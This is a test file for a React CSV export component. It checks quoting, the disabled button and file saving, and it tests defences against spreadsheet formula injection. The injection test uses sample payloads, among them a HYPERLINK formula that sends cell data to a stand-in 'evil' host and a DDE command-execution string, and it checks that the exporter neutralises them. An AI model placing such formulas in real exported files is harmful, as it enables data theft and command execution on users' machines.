// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it, onTestFinished, vi } from "vitest";
import { h } from "../testing";
import { CsvExport, csvCell, toCsv } from "./CsvExport";

type Row = { name: string; count: number | null };
const columns = [
  { header: "name", value: (row: Row) => row.name },
  { header: "count", value: (row: Row) => row.count },
];

describe("CsvExport", () => {
  afterEach(() => {
    cleanup();
    vi.restoreAllMocks();
  });

  it("quotes commas, quotes, and line breaks, and leaves nulls empty", () => {
    expect(toCsv([{ name: 'a, "b"\nc', count: null }, { name: "plain", count: 3 }], columns)).toBe('name,count\r\n"a, ""b""\nc",\r\nplain,3\r\n');
  });

  it("stops a spreadsheet from running text as a formula", () => {
    const rows = [
      { name: '=HYPERLINK("http://evil/?"&A1,"open")', count: 1 },
      { name: "+cmd|' /C calc'!A0", count: -5 },
      { name: "@SUM(1+1)", count: null },
      { name: "-2+3", count: null },
      { name: "\tx", count: null },
    ];
    expect(toCsv(rows, columns).split("\r\n").slice(1, 6)).toEqual([
      `"'=HYPERLINK(""http://evil/?""&A1,""open"")",1`,
      // A real negative number is written as it is.
      "'+cmd|' /C calc'!A0,-5",
      "'@SUM(1+1),",
      "'-2+3,",
      "'\tx,",
    ]);
    expect(csvCell("plain")).toBe("plain");
  });

  it("is disabled without rows and saves a file when clicked", () => {
    // jsdom has no object URLs. Put stand-ins on URL for this test and take them off after.
    const createObjectURL = vi.fn(() => "blob:csv");
    const saved = { createObjectURL: URL.createObjectURL, revokeObjectURL: URL.revokeObjectURL };
    const revokeObjectURL = vi.fn();
    Object.assign(URL, { createObjectURL, revokeObjectURL });
    vi.useFakeTimers();
    onTestFinished(() => {
      vi.useRealTimers();
      Object.assign(URL, saved);
    });
    const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => undefined);

    const { rerender } = render(h(CsvExport<Row>, { rows: [], columns, name: "things" }));
    expect(screen.getByRole("button", { name: "Export CSV" })).toHaveProperty("disabled", true);

    rerender(h(CsvExport<Row>, { rows: [{ name: "x", count: 1 }], columns, name: "things" }));
    fireEvent.click(screen.getByRole("button", { name: "Export CSV" }));
    expect(createObjectURL).toHaveBeenCalledTimes(1);
    vi.runAllTimers();
    expect(revokeObjectURL).toHaveBeenCalledWith("blob:csv");
    expect(click).toHaveBeenCalledTimes(1);
  });
});
